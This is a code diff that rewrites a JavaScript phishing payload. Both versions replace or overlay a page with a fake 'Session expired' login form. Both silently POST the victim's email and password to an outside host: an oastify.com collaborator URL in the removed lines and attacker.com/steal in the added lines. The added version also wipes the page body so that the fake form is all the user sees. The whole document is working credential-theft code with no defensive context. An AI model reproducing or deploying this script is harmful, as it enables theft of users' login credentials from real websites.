@@ -1,17 +1,29 @@
-document.write(`
-  <h2 style="font-family:sans-serif;">Session expired</h2>
-  <p>Please log in again to continue.</p>
-  <form onsubmit="fetch('https://joboi5is224xx9rpfluze1ydv41vpmka9.oastify.com/steal', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-      user: document.querySelector('#user').value,
-      pass: document.querySelector('#pass').value
-    })
-  }); return false;">
-    <input id="user" placeholder="Email" required><br>
-    <input id="pass" type="password" placeholder="Password" required><br>
-    <button type="submit">Log In</button>
-  </form>
-`);
+(function() {
+  const container = document.createElement("div");
+  container.innerHTML = `
+    <div style="font-family:sans-serif;padding:20px;">
+      <h2>Session expired</h2>
+      <p>Please log in again to continue.</p>
+      <form id="fakeLogin">
+        <input id="user" placeholder="Email" required><br><br>
+        <input id="pass" type="password" placeholder="Password" required><br><br>
+        <button type="submit">Log In</button>
+      </form>
+    </div>
+  `;
+  document.body.innerHTML = ""; // Optional: clear existing content
+  document.body.appendChild(container);
+
+  document.getElementById("fakeLogin").addEventListener("submit", function(e) {
+    e.preventDefault();
+    fetch("https://attacker.com/steal", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        user: document.getElementById("user").value,
+        pass: document.getElementById("pass").value
+      })
+    });
+  });
+})();
 
